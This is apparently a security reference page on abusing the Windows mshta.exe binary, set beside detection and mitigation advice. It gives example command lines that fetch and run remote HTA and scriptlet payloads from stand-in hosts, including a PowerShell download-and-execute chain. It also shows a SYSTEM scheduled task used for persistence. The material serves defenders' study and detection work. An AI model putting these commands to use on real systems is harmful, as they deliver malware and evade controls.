# mshta.exe
## What is it?
*```mshta.exe``` (Microsoft HTML Application Host) is a legitimate Windows executable used to run HTML Applications (HTAs) on Windows systems.*
*HTA files are essentially HTML files with scripting capabilities (VBScript, JScript) that can be used to automate tasks, create graphical user interfaces, or interact with the system.*

## Legitimate Usage
- **Running HTA Files** → ```mshta.exe``` is used to run HTA files that contain HTML, CSS, and scripts, typically for application UIs or system automation tasks.
- **System Automation** → IT professionals and developers use ```mshta.exe``` to execute administrative tasks via HTAs, including network configurations or system checks.
- **Embedding Scripts** → HTAs allow embedding of VBScript or JScript, which is useful for creating internal tools that interact with the operating system.

## How to abuse it
- **Executing Malicious HTA Files** → Attackers can use ```mshta.exe``` to execute malicious HTA files that contain embedded scripts (VBScript, JScript) for payload delivery or system exploitation.
- **Bypassing Security Controls** → Since ```mshta.exe``` is a trusted Windows binary, security tools may overlook its misuse, allowing attackers to bypass application whitelisting.
- **Fileless Malware** → HTAs executed with ```mshta.exe``` can run directly in memory, leaving no trace on disk and evading traditional file-based detection methods.
- **Social Engineering** → Attackers can use social engineering to trick users into running malicious HTAs, often disguised as seemingly legitimate documents or web pages.

## Example attacks
### 1. Malicious HTA Execution
*Attackers can use ```mshta.exe``` to execute malicious code embedded within an HTA file, leading to system compromise or payload delivery.*

**Run Malicious HTA File**

```
/cmd /c mshta.exe javascript:a=(GetObject("script:http://10.0.0.5/file.sct")).Exec();close();

mshta.exe http://malicious[.]site/payload.hta

mshta.exe "javascript:a=GetObject('script:http://malicious[.]site/payload.sct')"
```

*calc.exe is spawned by mshta.exe:*

![image](https://github.com/user-attachments/assets/0165509e-73ad-4a73-a70f-f9be47a1eb37)

*sysmon logs for mshta establishing network connections:*

![image](https://github.com/user-attachments/assets/01232198-2016-4da8-a19c-902be70a96ee)

**Effect:**
- The HTA file is downloaded and executed, running embedded malicious scripts like PowerShell or JavaScript that could download and execute malware.

### 2. Fileless Malware Delivery
*Attackers can use ```mshta.exe``` to execute a fileless malware payload directly from memory, avoiding the creation of files on disk.*

**Run PowerShell Script via HTA**

```
mshta.exe "javascript:eval('new ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -command \"Invoke-WebRequest -Uri http://malicious.com/payload.ps1 -OutFile C:\Windows\Temp\payload.ps1; Start-Process C:\Windows\Temp\payload.ps1\")")')"
```

**Effect:**
- The PowerShell script is executed directly in memory, bypassing file-based defenses and avoiding detection by traditional endpoint security solutions.

### 3. Bypassing Application Whitelisting
*Since ```mshta.exe``` is a legitimate Windows utility, it can be used to execute malicious HTA files even when other applications are blocked by application whitelisting solutions.*

**Execute Malicious HTA from Command Line**

```
mshta.exe C:\path\to\malicious.hta
```

**Effect:**
- The malicious HTA file is executed without triggering security alarms since ```mshta.exe``` is a trusted, whitelisted binary.

### 4. Social Engineering to Run Malicious HTA
*Attackers may craft malicious HTA files and distribute them via phishing emails, prompting users to open them by disguising them as seemingly legitimate documents or files.*

**Malicious Email Attachment**
- An email containing an attachment like ```invoice.hta``` or ```resume.hta``` may encourage users to open the file, unwittingly executing the embedded malicious code with ```mshta.exe```.

**Effect:**
- Once opened, the HTA file executes malicious scripts that can result in data theft, system compromise, or further payload delivery.

### 5. Persistence via HTA Files
*Attackers can use HTA files to maintain persistence by creating scheduled tasks or registry entries that automatically execute the HTA file on system startup.*

**Create Scheduled Task to Run Malicious HTA File**

```
schtasks /create /tn "StartupTask" /tr "mshta.exe C:\path\to\malicious.hta" /sc onstart /ru SYSTEM
```

**Effect:**
- The malicious HTA file is executed every time the system starts, ensuring persistence on the compromised system.

# Detection & Mitigation
## Detection Methods
**Monitor for Unusual mshta.exe Execution**
- **Event ID 4688 (Process Creation)** → Detect the execution of ```mshta.exe``` from unusual locations or with suspicious arguments.
- **Analyze Network Traffic** → Monitor for network activity related to the downloading of HTA files or PowerShell scripts executed via ```mshta.exe```.

**Look for Suspicious HTA Files**
- **Audit HTA Files** → Look for HTA files in unusual locations (e.g., temporary folders or external drives) or with suspicious content such as embedded scripts that download or execute malicious payloads.

**Detect Suspicious PowerShell Execution**
- **Event ID 4104 (PowerShell Script Block Logging)** → Look for PowerShell scripts executed through ```mshta.exe```, especially those that download external payloads or execute commands remotely.

## Mitigation Strategies
- **Block mshta.exe** → Use application whitelisting (e.g., AppLocker) to restrict execution of ```mshta.exe``` to authorized applications or users.
- **Monitor File Access Logs** → Detect suspicious HTA files by auditing file access logs for unusual modifications or executions.
- **Limit User Permissions** → Restrict user access to the ability to execute HTA files, especially in non-administrative contexts.
- **Disable Scripting in HTA Files** → Configure system policies to prevent scripts from being executed within HTA files, reducing the attack surface.
